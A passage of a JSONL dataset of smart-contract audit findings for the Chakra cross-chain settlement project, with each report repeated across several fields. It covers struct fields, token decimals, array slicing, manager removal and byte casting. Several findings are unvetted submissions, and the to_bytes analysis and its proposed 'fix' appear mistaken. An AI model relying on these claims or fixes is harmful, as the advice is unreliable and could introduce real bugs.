CrossChainMsgStatus.Pending\n        );\n\n```\n\nHowever, `address(this)` should be replaced by `to_handler`:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L31-40\n```\nstruct ReceivedCrossChainTx {\n        uint256 txid;\n        string from_chain;\n        string to_chain;\n        uint256 from_address;\n        uint256 from_handler;\n        address to_handler;\n        bytes payload;\n        CrossChainMsgStatus status;\n    }\n\n```\n\nAs you can see here, after `from_handler`, there is `to_handler` address but it's mistakenly set as `address(this)` which is an address of the settlement contract in reality.\n\nTherefore, `receive_cross_txs[txid]` has incorrect parameters when creating a new received transaction struct.\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nChange `address(this)` on `to_handler` address in a `receive_cross_txs[txid]` mapping.\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L211\n\n\n# Vulnerability details\n\n## Impact\n\n`receive_cross_chain_msg()` is located in the Settlement contract and is called after the Chakra network signature verification process. However, when creating `ReceivedCrossChainTx` struct for the new `receive_cross_txs[txid]`, the contract mistakenly uses `address(this)` instead of `to_handler` address.\n\n## Proof of Concept\n\nCurrently `receive_cross_txs[txId]` is assigned this way:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L205-214\n```\n receive_cross_txs[txid] = ReceivedCrossChainTx(\n            txid,\n            from_chain,\n            contract_chain_name,\n            from_address,\n            from_handler,\n            address(this),\n            payload,\n            CrossChainMsgStatus.Pending\n        );\n\n```\n\nHowever, `address(this)` should be replaced by `to_handler`:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L31-40\n```\nstruct ReceivedCrossChainTx {\n        uint256 txid;\n        string from_chain;\n        string to_chain;\n        uint256 from_address;\n        uint256 from_handler;\n        address to_handler;\n        bytes payload;\n        CrossChainMsgStatus status;\n    }\n\n```\n\nAs you can see here, after `from_handler`, there is `to_handler` address but it's mistakenly set as `address(this)` which is an address of the settlement contract in reality.\n\nTherefore, `receive_cross_txs[txid]` has incorrect parameters when creating a new received transaction struct.\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nChange `address(this)` on `to_handler` address in a `receive_cross_txs[txid]` mapping.\n\n\n## Assessed type\n\nOther"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-176", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 176, "page_start": null, "title": "Incorrect decimals Setting for ckrBTC Token May Lead to User Confusion and Inaccurate Transaction Amounts", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L78\n\n\n# Vulnerability details\n\n## Impact\nIn the OpenZeppelin library, the decimals of the ERC20 component defaults to 18, which is abnormal for BTC. Incorrect decimal settings may result in users entering incorrect amounts or understanding incorrect balances during transactions. This confusion may lead to property damage or transaction failure, especially when the transaction amount is large.\n\nIn the other hand, many tools, applications, or smart contracts related to Bitcoin may rely on an accuracy of 8 decimal places. If the accuracy setting is incorrect, these tools or contracts may not work properly, thereby affecting the operation of the entire ecosystem.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L78\n\n## Tools Used\nNone\n\n## Recommended Mitigation Steps\nRewrite the decimals to 8 for the ckrBTC token.\n\n\n## Assessed type\n\nDecimal\n", "sections": {"description_md": null, "impact_md": "## Impact\nIn the OpenZeppelin library, the decimals of the ERC20 component defaults to 18, which is abnormal for BTC. Incorrect decimal settings may result in users entering incorrect amounts or understanding incorrect balances during transactions. This confusion may lead to property damage or transaction failure, especially when the transaction amount is large.\n\nIn the other hand, many tools, applications, or smart contracts related to Bitcoin may rely on an accuracy of 8 decimal places. If the accuracy setting is incorrect, these tools or contracts may not work properly, thereby affecting the operation of the entire ecosystem.\n", "recommendation_md": "## Recommended Mitigation Steps\nRewrite the decimals to 8 for the ckrBTC token.\n\n\n## Assessed type\n\nDecimal\n", "poc_md": "## Proof of Concept\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L78\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L78\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nNone\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L78\n\n\n# Vulnerability details\n\n## Impact\nIn the OpenZeppelin library, the decimals of the ERC20 component defaults to 18, which is abnormal for BTC. Incorrect decimal settings may result in users entering incorrect amounts or understanding incorrect balances during transactions. This confusion may lead to property damage or transaction failure, especially when the transaction amount is large.\n\nIn the other hand, many tools, applications, or smart contracts related to Bitcoin may rely on an accuracy of 8 decimal places. If the accuracy setting is incorrect, these tools or contracts may not work properly, thereby affecting the operation of the entire ecosystem.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L78\n\n## Tools Used\nNone\n\n## Recommended Mitigation Steps\nRewrite the decimals to 8 for the ckrBTC token.\n\n\n## Assessed type\n\nDecimal\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L78\n\n\n# Vulnerability details\n\n## Impact\nIn the OpenZeppelin library, the decimals of the ERC20 component defaults to 18, which is abnormal for BTC. Incorrect decimal settings may result in users entering incorrect amounts or understanding incorrect balances during transactions. This confusion may lead to property damage or transaction failure, especially when the transaction amount is large.\n\nIn the other hand, many tools, applications, or smart contracts related to Bitcoin may rely on an accuracy of 8 decimal places. If the accuracy setting is incorrect, these tools or contracts may not work properly, thereby affecting the operation of the entire ecosystem.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/cairo/handler/src/ckr_btc.cairo#L78\n\n## Tools Used\nNone\n\n## Recommended Mitigation Steps\nRewrite the decimals to 8 for the ckrBTC token.\n\n\n## Assessed type\n\nDecimal"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-178", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 178, "page_start": null, "title": "Slicing an array includes the last index", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427\n\n\n# Vulnerability details\n\n## Impact\n\nSlicing includes the last index.\n\n## Proof of Concept\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n\nWhen u128_array_slice is called with Arr:[10,20,30,40,50] , begin with 1 and end with 3, it should return [20,30] but instead it returns [20,30,40]\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nEnsure that the slice does not include the last index\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nSlicing includes the last index.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nEnsure that the slice does not include the last index\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n\nWhen u128_array_slice is called with Arr:[10,20,30,40,50] , begin with 1 and end with 3, it should return [20,30] but instead it returns [20,30,40]\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427\n\n\n# Vulnerability details\n\n## Impact\n\nSlicing includes the last index.\n\n## Proof of Concept\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n\nWhen u128_array_slice is called with Arr:[10,20,30,40,50] , begin with 1 and end with 3, it should return [20,30] but instead it returns [20,30,40]\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nEnsure that the slice does not include the last index\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/utils.cairo#L427\n\n\n# Vulnerability details\n\n## Impact\n\nSlicing includes the last index.\n\n## Proof of Concept\n\n```\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n\nWhen u128_array_slice is called with Arr:[10,20,30,40,50] , begin with 1 and end with 3, it should return [20,30] but instead it returns [20,30,40]\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nEnsure that the slice does not include the last index\n\n\n## Assessed type\n\nContext"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-179", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 179, "page_start": null, "title": "`remove_manager` function doesn't check if the manager being removed is the last manager", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L261\n\n\n# Vulnerability details\n\nin fn remove_manager\n\n\n\n```solidity\nfunction remove_manager(address _manager) external onlyOwner {\n    revokeRole(MANAGER_ROLE, _manager);\n    emit ManagerRemoved(msg.sender, _manager);\n}\n```\n\nThe vulnerability is that this function doesn't check if the manager being removed is the last manager. This could lead to a situation where all managers are removed, potentially breaking the functionality of the contract.\n\nThe impact on the project could be significant:\n\n1. Managers have important roles in the system, such as adding/removing validators and setting the required number of validators.\n\n2. If all managers are removed, these critical functions can no longer be performed, which could severely limit or break the functionality of the settlement layer.\n\n3. This could lead to a situation where the contract becomes unusable or stuck in an undesirable state, as there would be no way to add new managers or perform manager-only actions.\n\n\nTo fix this vulnerability, the function should check if the manager being removed is the last one, and prevent the removal if it is. Here's a suggested fix:\n\n```solidity\nfunction remove_manager(address _manager) external onlyOwner {\n    require(getRoleMemberCount(MANAGER_ROLE) > 1, \"Cannot remove last manager\");\n    revokeRole(MANAGER_ROLE, _manager);\n    emit ManagerRemoved(msg.sender, _manager);\n}\n```\n\nThis change ensures that there's always at least one manager in the system, maintaining the ability to perform critical management functions.\n\n### Flow/PoC Example:\n\n```solidity\n// Assume we start with Owner and one Manager\n\n// Owner removes the only manager\nsettlement.remove_manager(manager_address);\n\n// Now, no address has MANAGER_ROLE\n\n// Try to add a validator (which requires MANAGER_ROLE)\ntry settlement.add_validator(new_validator_address) {\n    // This will fail due to lack of MANAGER_ROLE\n} catch Error(string memory reason) {\n    // Expected: \"AccessControl: account ... is missing role ...\"\n}\n\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": null, "recommendation_md": null, "poc_md": "### Flow/PoC Example:\n\n```solidity\n// Assume we start with Owner and one Manager\n\n// Owner removes the only manager\nsettlement.remove_manager(manager_address);\n\n// Now, no address has MANAGER_ROLE\n\n// Try to add a validator (which requires MANAGER_ROLE)\ntry settlement.add_validator(new_validator_address) {\n    // This will fail due to lack of MANAGER_ROLE\n} catch Error(string memory reason) {\n    // Expected: \"AccessControl: account ... is missing role ...\"\n}\n\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L261\n\n**container:**\n# Vulnerability details\n\nin fn remove_manager\n\n\n\n```solidity\nfunction remove_manager(address _manager) external onlyOwner {\n    revokeRole(MANAGER_ROLE, _manager);\n    emit ManagerRemoved(msg.sender, _manager);\n}\n```\n\nThe vulnerability is that this function doesn't check if the manager being removed is the last manager. This could lead to a situation where all managers are removed, potentially breaking the functionality of the contract.\n\nThe impact on the project could be significant:\n\n1. Managers have important roles in the system, such as adding/removing validators and setting the required number of validators.\n\n2. If all managers are removed, these critical functions can no longer be performed, which could severely limit or break the functionality of the settlement layer.\n\n3. This could lead to a situation where the contract becomes unusable or stuck in an undesirable state, as there would be no way to add new managers or perform manager-only actions.\n\n\nTo fix this vulnerability, the function should check if the manager being removed is the last one, and prevent the removal if it is. Here's a suggested fix:\n\n```solidity\nfunction remove_manager(address _manager) external onlyOwner {\n    require(getRoleMemberCount(MANAGER_ROLE) > 1, \"Cannot remove last manager\");\n    revokeRole(MANAGER_ROLE, _manager);\n    emit ManagerRemoved(msg.sender, _manager);\n}\n```\n\nThis change ensures that there's always at least one manager in the system, maintaining the ability to perform critical management functions.\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L261\n\n\n# Vulnerability details\n\nin fn remove_manager\n\n\n\n```solidity\nfunction remove_manager(address _manager) external onlyOwner {\n    revokeRole(MANAGER_ROLE, _manager);\n    emit ManagerRemoved(msg.sender, _manager);\n}\n```\n\nThe vulnerability is that this function doesn't check if the manager being removed is the last manager. This could lead to a situation where all managers are removed, potentially breaking the functionality of the contract.\n\nThe impact on the project could be significant:\n\n1. Managers have important roles in the system, such as adding/removing validators and setting the required number of validators.\n\n2. If all managers are removed, these critical functions can no longer be performed, which could severely limit or break the functionality of the settlement layer.\n\n3. This could lead to a situation where the contract becomes unusable or stuck in an undesirable state, as there would be no way to add new managers or perform manager-only actions.\n\n\nTo fix this vulnerability, the function should check if the manager being removed is the last one, and prevent the removal if it is. Here's a suggested fix:\n\n```solidity\nfunction remove_manager(address _manager) external onlyOwner {\n    require(getRoleMemberCount(MANAGER_ROLE) > 1, \"Cannot remove last manager\");\n    revokeRole(MANAGER_ROLE, _manager);\n    emit ManagerRemoved(msg.sender, _manager);\n}\n```\n\nThis change ensures that there's always at least one manager in the system, maintaining the ability to perform critical management functions.\n\n### Flow/PoC Example:\n\n```solidity\n// Assume we start with Owner and one Manager\n\n// Owner removes the only manager\nsettlement.remove_manager(manager_address);\n\n// Now, no address has MANAGER_ROLE\n\n// Try to add a validator (which requires MANAGER_ROLE)\ntry settlement.add_validator(new_validator_address) {\n    // This will fail due to lack of MANAGER_ROLE\n} catch Error(string memory reason) {\n    // Expected: \"AccessControl: account ... is missing role ...\"\n}\n\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L261\n\n\n# Vulnerability details\n\nin fn remove_manager\n\n\n\n```solidity\nfunction remove_manager(address _manager) external onlyOwner {\n    revokeRole(MANAGER_ROLE, _manager);\n    emit ManagerRemoved(msg.sender, _manager);\n}\n```\n\nThe vulnerability is that this function doesn't check if the manager being removed is the last manager. This could lead to a situation where all managers are removed, potentially breaking the functionality of the contract.\n\nThe impact on the project could be significant:\n\n1. Managers have important roles in the system, such as adding/removing validators and setting the required number of validators.\n\n2. If all managers are removed, these critical functions can no longer be performed, which could severely limit or break the functionality of the settlement layer.\n\n3. This could lead to a situation where the contract becomes unusable or stuck in an undesirable state, as there would be no way to add new managers or perform manager-only actions.\n\n\nTo fix this vulnerability, the function should check if the manager being removed is the last one, and prevent the removal if it is. Here's a suggested fix:\n\n```solidity\nfunction remove_manager(address _manager) external onlyOwner {\n    require(getRoleMemberCount(MANAGER_ROLE) > 1, \"Cannot remove last manager\");\n    revokeRole(MANAGER_ROLE, _manager);\n    emit ManagerRemoved(msg.sender, _manager);\n}\n```\n\nThis change ensures that there's always at least one manager in the system, maintaining the ability to perform critical management functions.\n\n### Flow/PoC Example:\n\n```solidity\n// Assume we start with Owner and one Manager\n\n// Owner removes the only manager\nsettlement.remove_manager(manager_address);\n\n// Now, no address has MANAGER_ROLE\n\n// Try to add a validator (which requires MANAGER_ROLE)\ntry settlement.add_validator(new_validator_address) {\n    // This will fail due to lack of MANAGER_ROLE\n} catch Error(string memory reason) {\n    // Expected: \"AccessControl: account ... is missing role ...\"\n}\n\n```\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-197", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 197, "page_start": null, "title": "Incorrect Byte Extraction in to_bytes Function", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L32\n\n\n# Vulnerability details\n\n### Summary\nThe to_bytes function attempts to extract a specified number of bytes from the input `bytes32`, but it does so incorrectly:\n\n1. It uses a left shift (`shl`) operation, which moves the most significant bytes of the input to the beginning of the output array.\n2. This approach effectively discards the least significant bytes of the input, which is typically not the desired behavior when working with Ethereum addresses or other data stored in `bytes32`.\n\n### Code Snippet\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L32\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    unchecked {\n        uint256 offset = 256 - _size * 8;\n        assembly {\n            mstore(add(result, 32), shl(offset, _addressBytes32))\n        }\n    }\n}\n```\n\n### Impact\n1. **Data Loss**: The function will always return the most significant bytes of the input, regardless of where the actual data of interest is located within the `bytes32`.\n2. **Inconsistency with Ethereum Conventions**: Ethereum typically stores addresses and other smaller data types in the least significant bytes of larger types like `bytes32`.\n\n### Example Scenario\nSuppose we have an Ethereum address stored in a `bytes32`:\n\n```solidity\naddress addr = 0x742d35Cc6634C0532925a3b844Bc454e4438f44e;\nbytes32 addrBytes32 = bytes32(uint256(uint160(addr)));\n```\n\nIf we call `to_bytes(addrBytes32, 20)`, we expect to get the 20 bytes representing the address. However, the current implementation will return the 20 most significant bytes of `addrBytes32`, which would be mostly zeros, not the actual address bytes.\n\n### Fix\nA correct implementation should extract the least significant bytes:\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    assembly {\n        mstore(add(result, 32), _addressBytes32)\n    }\n}\n```\n\nThis implementation simply copies the least significant bytes of the input `bytes32` to the output `bytes` array, which is the correct behavior for most Ethereum-related use cases.\n\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "### Impact\n1. **Data Loss**: The function will always return the most significant bytes of the input, regardless of where the actual data of interest is located within the `bytes32`.\n2. **Inconsistency with Ethereum Conventions**: Ethereum typically stores addresses and other smaller data types in the least significant bytes of larger types like `bytes32`.\n\n### Example Scenario\nSuppose we have an Ethereum address stored in a `bytes32`:\n\n```solidity\naddress addr = 0x742d35Cc6634C0532925a3b844Bc454e4438f44e;\nbytes32 addrBytes32 = bytes32(uint256(uint160(addr)));\n```\n\nIf we call `to_bytes(addrBytes32, 20)`, we expect to get the 20 bytes representing the address. However, the current implementation will return the 20 most significant bytes of `addrBytes32`, which would be mostly zeros, not the actual address bytes.\n", "recommendation_md": null, "poc_md": null, "fix_status_md": "### Fix\nA correct implementation should extract the least significant bytes:\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    assembly {\n        mstore(add(result, 32), _addressBytes32)\n    }\n}\n```\n\nThis implementation simply copies the least significant bytes of the input `bytes32` to the output `bytes` array, which is the correct behavior for most Ethereum-related use cases.\n\n\n\n## Assessed type\n\nContext\n", "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L32\n\n**container:**\n# Vulnerability details\n\n### Summary\nThe to_bytes function attempts to extract a specified number of bytes from the input `bytes32`, but it does so incorrectly:\n\n1. It uses a left shift (`shl`) operation, which moves the most significant bytes of the input to the beginning of the output array.\n2. This approach effectively discards the least significant bytes of the input, which is typically not the desired behavior when working with Ethereum addresses or other data stored in `bytes32`.\n\n### Code Snippet\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L32\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    unchecked {\n        uint256 offset = 256 - _size * 8;\n        assembly {\n            mstore(add(result, 32), shl(offset, _addressBytes32))\n        }\n    }\n}\n```\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L32\n\n\n# Vulnerability details\n\n### Summary\nThe to_bytes function attempts to extract a specified number of bytes from the input `bytes32`, but it does so incorrectly:\n\n1. It uses a left shift (`shl`) operation, which moves the most significant bytes of the input to the beginning of the output array.\n2. This approach effectively discards the least significant bytes of the input, which is typically not the desired behavior when working with Ethereum addresses or other data stored in `bytes32`.\n\n### Code Snippet\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L32\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    unchecked {\n        uint256 offset = 256 - _size * 8;\n        assembly {\n            mstore(add(result, 32), shl(offset, _addressBytes32))\n        }\n    }\n}\n```\n\n### Impact\n1. **Data Loss**: The function will always return the most significant bytes of the input, regardless of where the actual data of interest is located within the `bytes32`.\n2. **Inconsistency with Ethereum Conventions**: Ethereum typically stores addresses and other smaller data types in the least significant bytes of larger types like `bytes32`.\n\n### Example Scenario\nSuppose we have an Ethereum address stored in a `bytes32`:\n\n```solidity\naddress addr = 0x742d35Cc6634C0532925a3b844Bc454e4438f44e;\nbytes32 addrBytes32 = bytes32(uint256(uint160(addr)));\n```\n\nIf we call `to_bytes(addrBytes32, 20)`, we expect to get the 20 bytes representing the address. However, the current implementation will return the 20 most significant bytes of `addrBytes32`, which would be mostly zeros, not the actual address bytes.\n\n### Fix\nA correct implementation should extract the least significant bytes:\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    assembly {\n        mstore(add(result, 32), _addressBytes32)\n    }\n}\n```\n\nThis implementation simply copies the least significant bytes of the input `bytes32` to the output `bytes` array, which is the correct behavior for most Ethereum-related use cases.\n\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L32\n\n\n# Vulnerability details\n\n### 